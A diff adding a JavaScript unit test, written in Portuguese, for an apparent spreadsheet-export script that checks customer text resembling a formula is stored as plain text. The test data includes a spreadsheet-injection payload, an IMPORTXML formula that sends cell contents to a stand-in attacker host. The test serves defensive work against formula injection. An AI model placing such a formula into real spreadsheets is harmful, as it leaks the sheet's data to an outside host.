@@ -89,3 +89,14 @@ test('token errado vira mensagem clara', () => {
   const { gs } = carregar({ urlFetch: { fetch: recusa, fetchAll: (l) => l.map(recusa) } });
   assert.throws(() => gs.buscarPedidos({ url: 'https://balcao.exemplo', token: 'errado' }), /recusou o token/);
 });
+
+test('texto que parece fórmula entra na planilha como texto', () => {
+  const { gs } = carregar();
+  const p = pedido(1, 'pendente', 10, '2026-11-14 10:00:00');
+  p.cliente = '=IMPORTXML("https://ataque.exemplo/?"&A1,"//a")';
+  p.descricao = '+55 11 90000-0001';
+  const [linha] = gs.montarLinhas([p], HOJE);
+  assert.equal(linha[1], "'" + p.cliente);
+  assert.equal(linha[2], "'" + p.descricao);
+  assert.equal(gs.textoSeguro('Padaria'), 'Padaria');
+});
